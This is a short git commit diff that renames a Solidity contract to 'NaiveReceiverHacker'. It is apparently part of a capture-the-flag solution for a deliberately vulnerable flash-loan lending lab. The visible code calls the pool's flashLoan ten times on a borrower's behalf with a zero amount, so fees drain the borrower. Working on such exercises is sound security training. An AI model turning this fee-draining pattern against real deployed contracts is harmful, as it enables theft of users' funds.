4a08250f24cc3c65fcf6f2efe7f2f5bd669b1eea
Viktor Lavrenenko <lavrenenkoviktoren@gmail.com>
2023-01-27 13:14:47 +0200

    Add the NaiveReceiverHacker

--- contracts/naive-receiver/NaiveReceiverHacker.sol
+++ contracts/naive-receiver/NaiveReceiverHacker.sol
@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.13;
 
-contract Hacker {
+contract NaiveReceiverHacker {
     function hack(address pool, address borrower) external {
         for(uint i = 0; i < 10; i++) {
            (bool success,) = pool.call(abi.encodeWithSignature("flashLoan(address,uint256)", borrower, 0));
